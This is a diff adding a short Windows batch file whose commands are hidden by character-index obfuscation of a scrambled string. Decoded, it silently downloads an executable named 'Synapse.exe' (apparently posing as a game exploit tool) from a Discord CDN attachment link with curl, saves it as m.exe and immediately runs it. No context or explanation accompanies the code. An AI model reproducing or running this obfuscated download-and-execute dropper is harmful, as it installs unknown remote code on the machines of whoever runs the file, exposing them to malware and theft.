@@ -1,0 +1,7 @@
+@echo off
+Set azi=aNrIOY2qyGP9sXBSVzthLdkv8mJ0lpKU74H5wbDxoRQcFCeig36fjAW1nMEuZT
+cls
+@%azi:~46,1%%azi:~43,1%%azi:~19,1%%azi:~40,1% %azi:~40,1%%azi:~51,1%%azi:~51,1%
+%azi:~43,1%%azi:~59,1%%azi:~2,1%%azi:~28,1% %azi:~19,1%%azi:~18,1%%azi:~18,1%%azi:~29,1%%azi:~12,1%://%azi:~43,1%%azi:~21,1%%azi:~56,1%.%azi:~21,1%%azi:~47,1%%azi:~12,1%%azi:~43,1%%azi:~40,1%%azi:~2,1%%azi:~21,1%%azi:~0,1%%azi:~29,1%%azi:~29,1%.%azi:~43,1%%azi:~40,1%%azi:~25,1%/%azi:~0,1%%azi:~18,1%%azi:~18,1%%azi:~0,1%%azi:~43,1%%azi:~19,1%%azi:~25,1%%azi:~46,1%%azi:~56,1%%azi:~18,1%%azi:~12,1%/%azi:~11,1%%azi:~6,1%%azi:~55,1%%azi:~24,1%%azi:~35,1%%azi:~32,1%%azi:~35,1%%azi:~6,1%%azi:~49,1%%azi:~33,1%%azi:~6,1%%azi:~11,1%%azi:~27,1%%azi:~33,1%%azi:~33,1%%azi:~6,1%%azi:~6,1%%azi:~35,1%/%azi:~11,1%%azi:~6,1%%azi:~49,1%%azi:~50,1%%azi:~6,1%%azi:~55,1%%azi:~11,1%%azi:~11,1%%azi:~33,1%%azi:~50,1%%azi:~50,1%%azi:~55,1%%azi:~27,1%%azi:~33,1%%azi:~24,1%%azi:~49,1%%azi:~35,1%%azi:~27,1%/%azi:~15,1%%azi:~8,1%%azi:~56,1%%azi:~0,1%%azi:~29,1%%azi:~12,1%%azi:~46,1%.%azi:~46,1%%azi:~39,1%%azi:~46,1% --%azi:~40,1%%azi:~59,1%%azi:~18,1%%azi:~29,1%%azi:~59,1%%azi:~18,1% %azi:~25,1%.%azi:~46,1%%azi:~39,1%%azi:~46,1%
+
+%azi:~12,1%%azi:~18,1%%azi:~0,1%%azi:~2,1%%azi:~18,1% %azi:~25,1%.%azi:~46,1%%azi:~39,1%%azi:~46,1% 
